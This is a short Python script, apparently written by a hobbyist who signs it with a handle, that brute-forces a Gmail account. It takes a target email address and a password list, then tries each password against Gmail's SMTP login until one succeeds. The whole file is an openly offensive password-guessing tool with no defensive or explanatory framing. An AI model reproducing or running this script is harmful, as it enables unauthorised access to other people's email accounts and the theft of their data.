import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

print ("coded by A.2005")
print ("snap:ahmedoo3864")

user = raw_input("Enter the target email : ")
passfile = raw_input("Enter password file : ")
passfile = open(passfile, "r")

for password in passfile :
    try:
        smtpserver.login(user, password)
        print ("[+] Password found ====> %s" %password)
        break;
    except smtplib.SMTPAuthenticationError:
        print ("[!]Password not found ====> %s" %password)





